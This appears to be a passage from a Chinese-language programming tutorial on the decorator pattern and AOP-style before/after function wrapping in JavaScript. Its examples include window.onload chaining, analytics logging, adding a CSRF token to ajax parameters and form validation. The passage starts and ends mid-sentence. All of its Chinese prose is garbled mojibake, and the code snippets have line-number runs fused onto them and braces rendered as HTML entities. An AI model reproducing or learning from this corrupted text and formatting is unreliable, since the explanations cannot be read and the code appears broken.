æ–¹æ³•ï¼‰ï¼Œå½“è¯·æ±‚è¾¾åˆ°é“¾ä¸­çš„æŸä¸ªå¯¹è±¡çš„æ—¶å€™ï¼Œè¿™ä¸ªå¯¹è±¡ä¼šæ‰§è¡Œè‡ªèº«çš„æ“ä½œï¼ŒéšåŽæŠŠè¯·æ±‚è½¬å‘ç»™é“¾ä¸­çš„ä¸‹ä¸€ä¸ªå¯¹è±¡ã€‚ å› ä¸ºè£…é¥°è€…å¯¹è±¡å’Œå®ƒæ‰€è£…é¥°çš„å¯¹è±¡æ‹¥æœ‰ä¸€è‡´çš„æŽ¥å£ï¼Œæ‰€æœ‰å®ƒä»¬å¯¹ä½¿ç”¨è¯¥å¯¹è±¡çš„å®¢æˆ·æ¥è¯´æ˜¯é€æ˜Žçš„ï¼Œè¢«è£…é¥°çš„å¯¹è±¡ä¹Ÿå¹¶ä¸éœ€è¦äº†è§£å®ƒæ›¾ç»è¢«è£…é¥°è¿‡ï¼Œè¿™ç§é€æ˜Žæ€§ä½¿å¾—æˆ‘ä»¬å¯ä»¥é€’å½’åµŒå¥—ä»»æ„å¤šä¸ªè£…é¥°è€…å¯¹è±¡ã€‚ è£…é¥°è€…ä¹Ÿæ˜¯åŒ…è£…å™¨GoF åŽŸæƒ³æŠŠè£…é¥°è€…ï¼ˆdecoratorï¼‰æ¨¡å¼ç§°ä¸ºåŒ…è£…å™¨ï¼ˆwrapperï¼‰æ¨¡å¼. ä»ŽåŠŸèƒ½ä¸Šè€Œè¨€ï¼Œdecorator èƒ½å¾ˆå¥½åœ°æè¿°è¿™ä¸ªæ¨¡å¼ï¼Œä½†ä»Žç»“æž„ä¸Šçœ‹ï¼Œwrapper çš„è¯´æ³•æ›´åŠ è´´åˆ‡ã€‚è£…é¥°è€…æ¨¡å¼å°†ä¸€ä¸ªå¯¹è±¡åµŒå…¥å¦ä¸€ä¸ªå¯¹è±¡ä¹‹ä¸­çœ‹ï¼Œå®žé™…ä¸Šç›¸å½“äºŽè¿™ä¸ªå¯¹è±¡è¢«å¦ä¸€ä¸ªå¯¹è±¡åŒ…è£…èµ·æ¥ï¼Œå½¢æˆä¸€æ¡åŒ…è£…é“¾ã€‚è¯·æ±‚éšç€è¿™æ¡é“¾ä¾æ¬¡ä¼ é€’åˆ°æ‰€æœ‰çš„å¯¹è±¡ï¼Œæ¯ä¸ªå¯¹è±¡éƒ½æœ‰å¤„ç†è¿™æ¡è¯·æ±‚çš„æœºä¼šã€‚ å›žåˆ° JavaScript çš„è£…é¥°è€…JavaScript è¯­è¨€åŠ¨æ€æ”¹å˜å¯¹è±¡ç›¸å½“å®¹æ˜“ï¼Œæˆ‘ä»¬å¯ä»¥ç›´æŽ¥æ”¹å†™å¯¹è±¡æˆ–è€…å¯¹è±¡çš„æŸä¸ªæ–¹æ³•ï¼Œå¹¶ä¸éœ€è¦ä½¿ç”¨â€œç±»â€æ¥å®žçŽ°è£…é¥°è€…æ¨¡å¼ï¼Œä»£ç å¦‚ä¸‹ï¼š 123456789101112131415161718192021222324252627const plane = &#123; fire:function()&#123; console.log('å‘å°„æ™®é€šå­å¼¹'); &#125;&#125;const missileDecorator = function()&#123; console.log('å‘å°„å¯¼å¼¹');&#125;const atomDecorator = function()&#123; console.log('å‘å°„åŽŸå­å¼¹');&#125;const fire1 = plane.fire;plane.fire = function()&#123; fire1(); missileDecorator();&#125;const fire2 = plane.fire;plane.fire = function()&#123; fire2(); atomDecorator();&#125;plane.fire(); è£…é¥°å‡½æ•°åœ¨ JavaScript ä¸­ï¼Œå‡ ä¹Žä¸€åˆ‡éƒ½æ˜¯å¯¹è±¡ï¼Œå…¶ä¸­å‡½æ•°åˆè¢«ç§°ä¸ºä¸€ç­‰å¯¹è±¡ã€‚åœ¨å¹³æ—¶çš„å¼€å‘ä¸­ï¼Œä¹Ÿè®¸å¤§éƒ¨åˆ†æ—¶é—´éƒ½åœ¨è·Ÿå‡½æ•°æ‰“äº¤é“ã€‚åœ¨ JavaScript ä¸­å¯ä»¥å¾ˆæ–¹ä¾¿åœ°ç»™æŸä¸ªå¯¹è±¡æ‰©å±•å±žæ€§å’Œæ–¹æ³•ï¼Œä½†å´å¾ˆéš¾åœ¨ä¸æ”¹æ‡‚æŸä¸ªå‡½æ•°æºä»£ç çš„æƒ…å†µä¸‹ï¼Œç»™è¯¥å‡½æ•°æ·»åŠ ä¸€äº›é¢å¤–çš„åŠŸèƒ½ã€‚åœ¨ä»£ç çš„è¿è¡ŒæœŸé—´ï¼Œæˆ‘ä»¬å¾ˆéš¾åˆ‡å…¥æŸä¸ªå‡½æ•°çš„æ‰§è¡ŒçŽ¯å¢ƒã€‚ è¦ä¸ºå‡½æ•°æ·»åŠ ä¸€äº›åŠŸèƒ½ï¼Œæœ€ç®€å•ç²—æš´çš„æ–¹å¼å°±æ˜¯ç›´æŽ¥æ”¹å†™å‡½æ•°ï¼Œä½†æ˜¯è¿™æ˜¯æœ€å·®çš„æ–¹æ³•ï¼Œç›´æŽ¥è¿åäº†å¼€å‘-å°é—­çš„åŽŸåˆ™ã€‚ å¯ä»¥é€šè¿‡ä¿å­˜åŽŸå¼•ç”¨çš„æ–¹æ³•å°±å¯ä»¥æ”¹å†™æŸä¸ªå‡½æ•°ï¼š 12345678910let a = function()&#123; console.log(1);&#125;const _a = a;a = function()&#123; _a(); console.log(1);&#125;a(); è¿™æ˜¯å®žé™…å¼€å‘ä¸­å¾ˆå¸¸ç”¨çš„ä¸€ç§åšæ³•ï¼Œæ¯”å¦‚æˆ‘ä»¬æƒ³ç»™ window ç»‘å®š onload æ—¶é—´ï¼Œä½†æ˜¯åˆä¸ç¡®å®šè¿™ä¸ªäº‹ä»¶æ˜¯ä¸æ˜¯å·²ç»è¢«å…¶ä»–äººç»‘å®šè¿‡äº†ï¼Œä¸ºäº†é¿å…è¦†ç›–æŽ‰ä¹‹å‰çš„ window.onload å‡½æ•°ä¸­çš„è¡Œä¸ºï¼Œæˆ‘ä»¬ä¸€èˆ¬éƒ½ä¼šä¿å­˜å¥½åŽŸå…ˆçš„ window.onload ï¼ŒæŠŠå®ƒæ”¾å…¥æ–°çš„ window.onload é‡Œé¢æ‰§è¡Œï¼š 123456789window.onload = function()&#123; console.log(1);&#125;const _onload = window.onload || function()&#123;&#125;;window.onload = function()&#123; _onload(); console.log(2);&#125; è¿™æ ·çš„ä»£ç å½“ç„¶æ˜¯ç¬¦åˆå¼€æ”¾ï€­å°é—­åŽŸåˆ™çš„ï¼Œæˆ‘ä»¬åœ¨å¢žåŠ æ–°åŠŸèƒ½çš„æ—¶å€™ï¼Œç¡®å®žæ²¡æœ‰ä¿®æ”¹åŽŸæ¥çš„window.onload ä»£ç ï¼Œä½†æ˜¯è¿™ç§æ–¹å¼å­˜åœ¨ä»¥ä¸‹ä¸¤ä¸ªé—®é¢˜: å¿…é¡»ç»´æŠ¤ _onload è¿™ä¸ªä¸­é—´å˜é‡ï¼Œè™½ç„¶çœ‹èµ·æ¥å¹¶ä¸èµ·çœ¼ï¼Œä½†å¦‚æžœå‡½æ•°çš„è£…é¥°é“¾è¾ƒé•¿ï¼Œæˆ–è€…éœ€è¦è£…é¥°çš„å‡½æ•°å¾ˆå¤šï¼Œè¿™äº›ä¸­é—´å˜é‡ä¹Ÿä¼šè¶Šæ¥è¶Šå¤šã€‚ å…¶ä¸­è¿˜é‡åˆ°äº† this è¢«åŠ«æŒçš„é—®é¢˜ï¼Œåœ¨ window.onload çš„ä¾‹å­ä¸­æ²¡æœ‰è¿™ä¸ªçƒ¦æ¼ï¼Œæ˜¯å› ä¸ºè°ƒç”¨æ™®é€šå‡½æ•° _onloadæ—¶å€™ï¼Œthis ä¹ŸæŒ‡å‘ windowã€‚çŽ°åœ¨æŠŠ window.onload æ”¹æˆ document.getElementById,ä»£ç å¦‚ä¸‹ï¼š 12345678const _getElementById = document.getElementById;document.getElementById = function(id)&#123; console.log('3'); return _getElementById(id);&#125;const button = document.getElementById('button');// è¾“å‡ºï¼š Uncaught TypeError: Illegal invocation æ­¤æ—¶_getElementById æ˜¯ä¸€ä¸ªå…¨å±€å‡½æ•°ï¼Œå½“è°ƒç”¨ä¸€ä¸ªå…¨å±€å‡½æ•°æ—¶ï¼Œthis æ˜¯æŒ‡å‘ window çš„ï¼Œè€Œ document.getElementById æ–¹æ³•çš„å†…éƒ¨å®žçŽ°éœ€è¦ä½¿ç”¨ this å¼•ç”¨ï¼Œthis åœ¨è¿™ä¸ªæ–¹æ³•å†…é¢„æœŸæ˜¯æŒ‡å‘ documentï¼Œè€Œä¸æ˜¯ window, è¿™æ˜¯é”™è¯¯å‘ç”Ÿçš„åŽŸå› æ‰€ä»¥ä½¿ç”¨çŽ°åœ¨çš„æ–¹å¼ç»™å‡½æ•°å¢žåŠ åŠŸèƒ½å¹¶ä¸ä¿é™©ã€‚ æ”¹è¿›åŽçš„ä»£ç å¯ä»¥æ»¡è¶³éœ€æ±‚ï¼Œæˆ‘ä»¬è¦æ‰‹åŠ¨æŠŠ document å½“ä½œä¸Šä¸‹æ–‡ this ä¼ å…¥_getElementByIdï¼š 1234567const _getElementById = document.getElementById;document.getElementById = function(id)&#123; console.log('3'); return _getElementById.apply(document,arguments);&#125;const button = document.getElementById('button'); ç”¨ AOP è£…é¥°å‡½æ•°é¦–å…ˆç»™å‡º Funtion.prototype.before å’Œ Function.prototype.after æ–¹æ³•ï¼š 12345678910111213141516Function.prototype.before = function(beforefn)&#123; const _self = this; return function()&#123; beforefn.apply(this,arguments); return _self.apply(this,arguments); &#125;&#125;Function.prototype.after = function(afterfn)&#123; const _self = this; return function()&#123; const ret = _self.apply(this,arguments); afterfn.apply(this,arguments); return ret; &#125;&#125; Function.prototype.before æŽ¥å—ä¸€ä¸ªå‡½æ•°ä½œä¸ºå‚æ•°ï¼Œè¿™ä¸ªå‡½æ•°å³ä¸ºæ–°æ·»åŠ çš„å‡½æ•°ï¼Œå®ƒè½¬è½½äº†æ–°æ·»åŠ çš„åŠŸèƒ½ä»£ç ã€‚ æŽ¥ä¸‹æ¥æŠŠå½“å‰çš„ this ä¿å­˜èµ·æ¥ï¼Œè¿™ä¸ª this æŒ‡å‘åŽŸå‡½æ•°ï¼Œç„¶åŽè¿”å›žä¸€ä¸ªâ€œä»£ç†â€å‡½æ•°ï¼Œè¿™ä¸ªâ€œä»£ç†â€å‡½æ•°åªæ˜¯ç»“æž„ä¸Šåƒä»£ç†è€Œå·²ï¼Œå¹¶ä¸æ‰¿æ‹…ä»£ç†çš„èŒè´£ï¼ˆæ¯”å¦‚æŽ§åˆ¶å¯¹è±¡çš„è®¿é—®ç­‰ï¼‰ã€‚å®ƒçš„å·¥ä½œæ˜¯æŠŠè¯·æ±‚åˆ†åˆ«è½¬å‘ç»™æ–°æ·»åŠ çš„å‡½æ•°å’ŒåŽŸå‡½æ•°ï¼Œä¸”è´Ÿè´£ä¿è¯å®ƒä»¬çš„æ‰§è¡Œé¡ºåºï¼Œè®©æ–°æ·»åŠ çš„å‡½æ•°åœ¨åŽŸå‡½æ•°ä¹‹å‰æ‰§è¡Œï¼ˆå‰ç½®è£…é¥°ï¼‰ï¼Œè¿™æ ·å°±å®žçŽ°äº†åŠ¨æ€è£…é¥°çš„æ•ˆæžœã€‚ æˆ‘ä»¬æ³¨æ„åˆ°ï¼Œé€šè¿‡ Function.prototype.apply æ¥åŠ¨æ€ä¼ å…¥æ­£ç¡®çš„ thisï¼Œä¿è¯äº†å‡½æ•°åœ¨è¢«è£…é¥°ä¹‹åŽï¼Œthis ä¸ä¼šè¢«åŠ«æŒã€‚Function.prototype.after çš„åŽŸç†è·Ÿ Function.prototype.before ä¸€æ¨¡ä¸€æ ·ï¼Œå”¯ä¸€ä¸åŒçš„åœ°æ–¹åœ¨äºŽè®©æ–°æ·»åŠ çš„å‡½æ•°åœ¨åŽŸå‡½æ•°æ‰§è¡Œä¹‹åŽå†æ‰§è¡Œã€‚ ä¸‹é¢æ¥è¯•è¯•ç”¨ Function.prototype.before çš„å¨åŠ›ï¼š 1234567891011121314document.getElementById = document.getElementById.before(function()&#123; console.log('before');&#125;).after(function()&#123; console.log('after');&#125;);const button = document.getElementById('button'); window.onload = (window.onload || function()&#123;&#125;).after(function()&#123; console.log(1)&#125;).after(function()&#123; console.log(2);&#125;).after(function()&#123; console.log(3)&#125;); å€¼å¾—æåˆ°çš„æ˜¯ï¼Œä¸Šé¢çš„ AOP å®žçŽ°æ˜¯åœ¨ Function.prototype ä¸Šæ·»åŠ  before å’Œ after æ–¹æ³•ï¼Œä½†è®¸å¤šäººä¸å–œæ¬¢è¿™ç§æ±¡æŸ“åŽŸåž‹çš„æ–¹å¼ï¼Œé‚£ä¹ˆæˆ‘ä»¬å¯ä»¥åšä¸€äº›å˜é€šï¼ŒæŠŠåŽŸå‡½æ•°å’Œæ–°å‡½æ•°éƒ½ä½œä¸ºå‚æ•°ä¼ before æˆ–è€… after æ–¹æ³•ï¼š 123456789101112131415161718192021const before = function(fn,beforefn)&#123; return function()&#123; beforefn.apply(this,arguments); return fn.apply(this,arguments); &#125;&#125;const after = function(fn,afterfn)&#123; return function()&#123; const ret = fn.apply(this,arguments); afterfn.apply(this,arguments); return ret; &#125;&#125; const a = before(function()&#123; console.log('fn')&#125;,function()&#123; console.log('beforefn');&#125;);a(); AOP çš„åº”ç”¨å®žä¾‹ç”¨ AOP è£…é¥°å‡½æ•°çš„æŠ€å·§åœ¨å®žé™…å¼€å‘ä¸­éžå¸¸æœ‰ç”¨ï¼Œæ— è®ºæ˜¯ä¸šåŠ¡ä»£ç çš„ç¼–å†™ï¼Œè¿˜æ˜¯æ¡†æž¶å±‚é¢ï¼Œæˆ‘ä»¬éƒ½å¯ä»¥æŠŠè¡Œä¸ºä¾ç…§èŒè´£åˆ†æˆç²’åº¦æ›´ç»†çš„å‡½æ•°ï¼ŒéšåŽé€šè¿‡è£…é¥°åœ¨å®ƒä»¬åˆå¹¶åœ¨ä¸€èµ·ï¼Œè¿™æœ‰åŠ©äºŽæˆ‘ä»¬ç¼–å†™ä¸€ä¸ªé€è€¦åˆå’Œé«˜å¤ç”¨æ€§çš„å‡½æ•°ã€‚ æ•°æ®ç»Ÿè®¡ä¸Šä¼ åˆ†ç¦»ä¸šåŠ¡diamå’Œæ•°æ®ç»Ÿè®¡ä»£ç ï¼Œæ— è®ºåœ¨ä»€ä¹ˆè¯­è¨€ï¼Œéƒ½æ˜¯ AOP çš„ç»å…¸å¼•ç”¨ä¹‹ä¸€ã€‚åœ¨é¡¹ç›®å¼€å‘çš„ç»“å°¾éš¾å…è¦åŠ ä¸Šå¾ˆå¤šç»Ÿè®¡æ•°æ®çš„ä»£ç ã€‚ï¼Œè¿™äº›è¿‡ç¨‹å¯èƒ½è®©æˆ‘ä»¬è¢«è¿«æ”¹åŠ¨æ—©å·²å°è£…å¥½çš„å‡½æ•°ã€‚ æ¯”å¦‚é¡µé¢ä¸­æœ‰ä¸€ä¸ªç™»å½• buttonï¼Œç‚¹å‡» button ä¼šå¼¹å‡ºç™»å½•æµ®å±‚ï¼Œä¸Žæ­¤åŒæ—¶åœ¨è¿›è¡Œæ•°æ®ä¸ŠæŠ¥ã€‚æ¥ç»Ÿè®¡æœ‰å¤šå°‘ç”¨æˆ·ç‚¹å‡»äº†è¿™ä¸ªç™»å½• buttonï¼š 123456789const showLogin = function()&#123; console.log('æ‰“å¼€ç™»å½•æµ®å±‚'); log(this.getAttribute('tag'));&#125;const log = function(tag)&#123; console.log('ä¸ŠæŠ¥çš„æ ‡ç­¾ï¼š'+tag);&#125;document.getElementById('button').onclick = showLogin; æˆ‘ä»¬çœ‹åˆ°åœ¨ showLogin å‡½æ•°é‡Œï¼Œæ—¢è¦è´Ÿè´£æ‰“å¼€ç™»å½•æµ®å±‚ï¼Œåˆè¦è´Ÿè´£æ•°æ®ä¸ŠæŠ¥ï¼Œè¿™æ˜¯ä¸¤ä¸ªå±‚é¢çš„åŠŸèƒ½ï¼Œåœ¨æ­¤å¤„å´è¢«è€¦åˆåœ¨ä¸€ä¸ªå‡½æ•°é‡Œã€‚ä½¿ç”¨ AOP åˆ†ç¦»ä¹‹åŽï¼Œä»£ç å¦‚ä¸‹ï¼š 12345678910let showLogin = function()&#123; console.log('æ‰“å¼€ç™»å½•æµ®å±‚');&#125;const log = function()&#123; console.log('ä¸ŠæŠ¥çš„æ ‡ç­¾ï¼š'+this.getAttribute('tag'));&#125;showLogin = showLogin.after(log);document.getElementById('button').onclick = showLogin; ç”¨ AOP åŠ¨æ€æ”¹å˜å‡½æ•°çš„å‚æ•°beforefn å’ŒåŽŸå‡½æ•° self å…±ç”¨ä¸€ç»„å‚æ•°åˆ—è¡¨argumentsï¼Œå½“æˆ‘ä»¬åœ¨ beforefn çš„å‡½æ•°ä½“å†…æ”¹å˜ arguments çš„æ—¶å€™ï¼ŒåŽŸå‡½æ•° self æŽ¥æ”¶çš„å‚æ•°åˆ—è¡¨è‡ªç„¶ä¹Ÿä¼šå˜åŒ– ä¸‹é¢çš„ä¾‹å­å±•ç¤ºäº†å¦‚ä½•é€šè¿‡ Function.prototype.before æ–¹æ³•ç»™å‡½æ•° func çš„å‚æ•° param åŠ¨æ€åœ°æ·»åŠ å±žæ€§ bï¼š 123456789101112131415Function.prototype.before = function( beforefn )&#123; var __self = this; return function()&#123; beforefn.apply( this, arguments ); return __self.apply( this, arguments ); &#125; &#125; let func = function(param)&#123; console.log(param)ï¼›&#125;func = func.before(function(param)&#123; param.b = 'b';&#125;);func(&#123;a:'a'&#125;); çŽ°åœ¨æœ‰ä¸€ä¸ªç”¨äºŽå‘èµ· ajax è¯·æ±‚çš„å‡½æ•°ï¼Œè¿™ä¸ªå‡½æ•°è´Ÿè´£é¡¹ç›®ä¸­æ‰€æœ‰çš„ ajax å¼‚æ­¥è¯·æ±‚ï¼š 12345const ajax = function(type,url,param)&#123; console.dir(param); // å‘èµ·ajax çš„ä»£ç &#125;ajax( 'get', 'http:// xxx.com/userinfo', &#123; name: 'sven' &#125; ); ä¸Šé¢çš„ä¼ªä»£ç è¡¨ç¤ºå‘åŽå° cgi å‘èµ·ä¸€ä¸ªè¯·æ±‚æ¥èŽ·å–ç”¨æˆ·ä¿¡æ¯ï¼Œä¼ é€’ç»™ cgi çš„å‚æ•°æ˜¯{ name: â€˜svenâ€™ } ajax å‡½æ•°åœ¨é¡¹ç›®ä¸­ä¸€ç›´è¿è½¬è‰¯å¥½ï¼Œè·Ÿ cgi çš„åˆä½œä¹Ÿå¾ˆæ„‰å¿«ã€‚ç›´åˆ°æœ‰ä¸€å¤©ï¼Œæˆ‘ä»¬çš„ç½‘ç«™é­å—äº†CSRF æ”»å‡»ã€‚è§£å†³ CSRF æ”»å‡»æœ€ç®€å•çš„ä¸€ä¸ªåŠžæ³•å°±æ˜¯åœ¨ HTTP è¯·æ±‚ä¸­å¸¦ä¸Šä¸€ä¸ª Token å‚æ•°ã€‚ å‡è®¾æˆ‘ä»¬å·²ç»æœ‰ä¸€ä¸ªç”¨äºŽç”Ÿæˆ Token çš„å‡½æ•°ï¼š 12345678const getToken = function()&#123; return 'Token';&#125;// ç»™æ¯ä¸ª ajax è¯·æ±‚éƒ½åŠ ä¸Š Token å‚æ•°const ajax = function( type, url, param )&#123; param = param || &#123;&#125;; Param.Token = getToken(); // å‘é€ ajax è¯·æ±‚çš„ä»£ç ç•¥... &#125;; è™½ç„¶å·²ç»è§£å†³äº†é—®é¢˜ï¼Œä½†æˆ‘ä»¬çš„ ajax å‡½æ•°ç›¸å¯¹å˜å¾—åƒµç¡¬äº†ï¼Œæ¯ä¸ªä»Ž ajax å‡½æ•°é‡Œå‘å‡ºçš„è¯·æ±‚éƒ½è‡ªåŠ¨å¸¦ä¸Šäº† Token å‚æ•°ï¼Œè™½ç„¶åœ¨çŽ°åœ¨çš„é¡¹ç›®ä¸­æ²¡æœ‰ä»€ä¹ˆé—®é¢˜ï¼Œä½†å¦‚æžœå°†æ¥æŠŠè¿™ä¸ªå‡½æ•°ç§»æ¤åˆ°å…¶ä»–é¡¹ç›®ä¸Šï¼Œæˆ–è€…æŠŠå®ƒæ”¾åˆ°ä¸€ä¸ªå¼€æºåº“ä¸­ä¾›å…¶ä»–äººä½¿ç”¨ï¼ŒToken å‚æ•°éƒ½å°†æ˜¯å¤šä½™çš„ã€‚ä¹Ÿè®¸å¦ä¸€ä¸ªé¡¹ç›®ä¸éœ€è¦éªŒè¯ Tokenï¼Œæˆ–è€…æ˜¯ Token çš„ç”Ÿæˆæ–¹å¼ä¸åŒï¼Œæ— è®ºæ˜¯å“ªç§æƒ…å†µï¼Œéƒ½å¿…é¡»é‡æ–°ä¿®æ”¹ ajax å‡½æ•°ã€‚ä¸ºäº†è§£å†³è¿™ä¸ªé—®é¢˜ï¼Œå…ˆæŠŠ ajax å‡½æ•°è¿˜åŽŸæˆä¸€ä¸ªå¹²å‡€çš„å‡½æ•°ï¼š 12345678910111213let ajax = function( type, url, param )&#123; console.log(param);&#125;; // æŠŠ Token å‚æ•°é€šè¿‡ Function.prototyte.before è£…é¥°åˆ° ajax å‡½æ•°çš„å‚æ•° param å¯¹è±¡ä¸­ï¼šconst getToken = function()&#123; return 'Token';&#125;ajax = ajax.before(function(type,url,param)&#123; param.Token = getToken();&#125;);ajax( 'get', 'http:// xxx.com/userinfo', &#123; name: 'sven' &#125; ); // ä»Ž ajax å‡½æ•°æ‰“å°çš„ log å¯ä»¥çœ‹åˆ°ï¼ŒToken å‚æ•°å·²ç»è¢«é™„åŠ åˆ°äº† ajax è¯·æ±‚çš„å‚æ•°ä¸­:// &#123;name: "sven", Token: "Token"&#125; æ˜Žæ˜¾å¯ä»¥çœ‹åˆ°ï¼Œç”¨ AOP çš„æ–¹å¼ç»™ ajax å‡½æ•°åŠ¨æ€è£…é¥°ä¸Š Token å‚æ•°ï¼Œä¿è¯äº† ajax å‡½æ•°æ˜¯ä¸€ä¸ªç›¸å¯¹çº¯å‡€çš„å‡½æ•°ï¼Œæé«˜äº† ajax å‡½æ•°çš„å¯å¤ç”¨æ€§ï¼Œå®ƒåœ¨è¢«è¿å¾€å…¶ä»–é¡¹ç›®çš„æ—¶å€™ï¼Œä¸éœ€è¦åšä»»ä½•ä¿®æ”¹ æ’ä»¶å¼çš„è¡¨å•éªŒè¯æˆ‘ä»¬å¾ˆå¤šäººå†™è¿‡è®¸å¤šè¡¨å•éªŒè¯çš„ä»£ç ï¼Œåœ¨ä¸€ä¸ª Web é¡¹ç›®ä¸­ï¼Œå¯èƒ½å­˜åœ¨å¾ˆå¤šè¡¨å•ï¼Œå¦‚æ³¨å†Œã€ç™»å½•ã€ä¿®æ”¹ç”¨æˆ·ä¿¡æ¯ç­‰ã€åœ¨è¡¨å•æ•°æ®æäº¤ç»™åŽå°ä¹‹å‰ï¼Œå¸¸å¸¸è¦åšä¸€äº›æ ¡éªŒï¼Œæ¯”å¦‚ç™»å½•çš„æ—¶å€™éœ€è¦éªŒè¯ç”¨æˆ·åå’Œå¯†ç æ˜¯å¦ä¸ºç©ºï¼Œä»£ç å¦‚ä¸‹ï¼š 123456789101112131415161718192021const username = document.getElementById('username'),password = document.getElementById('password'),submitBtn = document.getElementById('submitBtn');const formSubmit = function()&#123; if(username.value === '')&#123; return alert('ç”¨æˆ·åä¸èƒ½ä¸ºç©º'); &#125; if(password.value === '')&#123; return alert('å¯†ç ä¸èƒ½ä¸ºç©º'); &#125; const param = &#123; username:username.value, password:password.value &#125; // ajax( 'http:// xxx.com/login', param ); // ajax å…·ä½“å®žçŽ°ç•¥&#125;submitBtn.onclick = function()&#123; formSubmit(); &#125; formSubmit å‡½æ•°åœ¨æ­¤å¤„æ‰¿æ‹…äº†ä¸¤ä¸ªèŒè´£ï¼Œé™¤äº†æäº¤ ajax è¯·æ±‚ä¹‹å¤–ï¼Œè¿˜è¦éªŒè¯ç”¨æˆ·è¾“å…¥çš„åˆæ³•æ€§ã€‚è¿™ç§ä»£ç ä¸€æ¥ä¼šé€ æˆå‡½æ•°è‡ƒè‚¿ï¼ŒèŒè´£æ··ä¹±ï¼ŒäºŒæ¥è°ˆä¸ä¸Šä»»ä½•å¯å¤ç”¨æ€§ã€‚æœ¬èŠ‚çš„ç›®çš„æ˜¯åˆ†ç¦»æ ¡éªŒè¾“å…¥å’Œæäº¤ ajax è¯·æ±‚çš„ä»£ç ï¼Œæˆ‘ä»¬æŠŠæ ¡éªŒè¾“å…¥çš„é€»è¾‘æ”¾åˆ° validataå‡½æ•°ä¸­ï¼Œå¹¶ä¸”çº¦å®šå½“ validata å‡½æ•°è¿”å›ž false çš„æ—¶å€™ï¼Œè¡¨ç¤ºæ ¡éªŒæœªé€šè¿‡ï¼Œä»£ç å¦‚ä¸‹: 123456789101112131415161718192021222324submitBtn.onclick = function()&#123; formSubmit(); &#125; const validata = function()&#123; if(username.value === '')&#123; alert('ç”¨æˆ·åä¸èƒ½ä¸ºç©º'); return false; &#125; if(password.value === '')&#123; alert('å¯†ç ä¸èƒ½ä¸ºç©º'); return false; &#125;&#125;const formSubmit = function()&#123; if(!validata())&#123; return; &#125; const param = &#123; username:username.value, password:password.value &#125; // ajax( 'http:// xxx.com/login', param ); // ajax å…·ä½“å®žçŽ°ç•¥&#125; çŽ°åœ¨çš„ä»£ç å·²ç»æœ‰äº†ä¸€äº›æ”¹è¿›ï¼Œæˆ‘ä»¬æŠŠæ ¡éªŒçš„é€»è¾‘éƒ½æ”¾åˆ°äº† validata å‡½æ•°ä¸­ï¼Œä½† formSubmitå‡½æ•°çš„å†…éƒ¨è¿˜è¦è®¡ç®— validata å‡½æ•°çš„è¿”å›žå€¼ï¼Œå› ä¸ºè¿”å›žå€¼çš„ç»“æžœè¡¨æ˜Žäº†æ˜¯å¦é€šè¿‡æ ¡éªŒã€‚æŽ¥ä¸‹æ¥è¿›ä¸€æ­¥ä¼˜åŒ–è¿™æ®µä»£ç ï¼Œä½¿ validata å’Œ formSubmit å®Œå…¨åˆ†ç¦»å¼€æ¥ã€‚é¦–å…ˆè¦æ”¹å†™ Function. prototype.beforeï¼Œå¦‚æžœ beforefn çš„æ‰§è¡Œç»“æžœè¿”å›ž falseï¼Œè¡¨ç¤ºä¸å†æ‰§è¡ŒåŽé¢çš„åŽŸå‡½æ•°ï¼Œä»£ç å¦‚ä¸‹ï¼š 123456789101112131415161718192021222324252627282930Function.prototype.before = function(beforefn)&#123; const _self = this; return function()&#123; if(!beforefn.apply(this,arguments))&#123; return; &#125; return _self.apply(this,arguments); &#125;&#125;const validata = function()&#123; if(username.value === '')&#123; alert('ç”¨æˆ·åä¸èƒ½ä¸ºç©º'); return false; &#125; if(password.value === '')&#123; alert('å¯†ç ä¸èƒ½ä¸ºç©º'); return false; &#125;&#125;let formSubmit = function()&#123; const param = &#123; username:username.value, password:password.value &#125; // ajax( 'http:// xxx.com/login', param ); // ajax å…·ä½“å®žçŽ°ç•¥&#125;formSubmit = formSubmit.before(validata);submitBtn.onclick = function()&#123; formSubmit(); &#125; åœ¨è¿™æ®µä»£ç ä¸­ï¼Œæ ¡éªŒè¾“å…¥å’Œæäº¤è¡¨å•çš„ä»£ç å®Œå…¨åˆ†ç¦»å¼€æ¥ï¼Œå®ƒä»¬ä¸å†æœ‰ä»»ä½•è€¦åˆå…³ç³»ï¼ŒformSubmit = formSubmit.before( validata )è¿™å¥ä»£ç ï¼Œå¦‚åŒæŠŠæ ¡éªŒè§„åˆ™åŠ¨æ€æŽ¥åœ¨ formSubmit å‡½æ•°ä¹‹å‰ï¼Œvalidata æˆä¸ºä¸€ä¸ªå³æ’å³ç”¨çš„å‡½æ•°ï¼Œå®ƒç”šè‡³å¯ä»¥è¢«å†™æˆé…ç½®æ–‡ä»¶çš„å½¢å¼ï¼Œè¿™æœ‰åˆ©äºŽæˆ‘ä»¬åˆ†å¼€ç»´æŠ¤è¿™ä¸¤ä¸ªå‡½æ•°ã€‚å†åˆ©ç”¨ç­–ç•¥æ¨¡å¼ç¨åŠ æ”¹é€ ï¼Œæˆ‘ä»¬å°±å¯ä»¥æŠŠè¿™äº›æ ¡éªŒè§„åˆ™éƒ½å†™æˆæ’ä»¶çš„å½¢å¼ï¼Œç”¨åœ¨ä¸åŒçš„é¡¹ç›®å½“ä¸­ã€‚ å€¼å¾—æ³¨æ„çš„æ˜¯ï¼Œå› ä¸ºå‡½æ•°é€šè¿‡ Function.prototype.before æˆ–è€… Function.prototype.after è¢«è£…é¥°ä¹‹åŽï¼Œè¿”å›žçš„å®žé™…ä¸Šæ˜¯ä¸€ä¸ªæ–°çš„å‡½æ•°ï¼Œå¦‚æžœåœ¨åŽŸå‡½æ•°ä¸Šä¿å­˜äº†ä¸€äº›å±žæ€§ï¼Œé‚£ä¹ˆè¿™äº›å±žæ€§ä¼šä¸¢å¤±ã€‚ä»£ç å¦‚ä¸‹ï¼š 12345678var func = function()&#123; alert( 1 ); &#125; func.a = 'a'; func = func.after( function()&#123; alert( 2 ); &#125;); alert ( func.a ); // è¾“å‡ºï¼šundefined å¦å¤–ï¼Œè¿™ç§è£…é¥°æ–¹å¼ä¹Ÿå åŠ äº†å‡½æ•°çš„ä½œç”¨åŸŸï¼Œå¦‚æžœè£…é¥°çš„é“¾æ¡è¿‡é•¿ï¼Œæ€§èƒ½ä¸Šä¹Ÿä¼šå—åˆ°ä¸€äº›å½±å“ è£…é¥°è€…æ¨¡å¼å’Œä»£ç†æ¨¡å¼è¿™ä¸¤ç§æ¨¡å¼çš„ç»“æž„çœ‹èµ·æ¥éžå¸¸ç›¸åƒï¼Œè¿™ä¸¤ç§æ¨¡å¼éƒ½æè¿°äº†æ€Žæ 